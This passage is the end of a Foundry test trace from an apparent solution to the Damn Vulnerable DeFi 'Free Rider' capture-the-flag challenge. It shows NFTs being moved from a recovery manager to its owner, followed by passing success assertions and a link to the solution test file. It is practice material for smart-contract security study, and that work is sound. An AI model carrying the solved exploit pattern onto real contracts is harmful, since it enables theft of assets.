    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 2)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 3)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 3)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 4)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 4)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 5)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 5)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [425] FreeRiderNFTMarketplace::offersCount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertLt(15000000000000000000 [1.5e19], 90000000000000000000 [9e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertGt(45060000000000000000 [4.506e19], 45000000000000000000 [4.5e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.62ms (4.17ms CPU time)

```



🔗 **GitHub**:[View](https://github.com/SCATERLABs/CTFs/blob/0465130a63d25a8078a39b3241c9a8c7e101b7f1/Dam-vulnerable-Defi/test/free-rider/FreeRider.t.sol)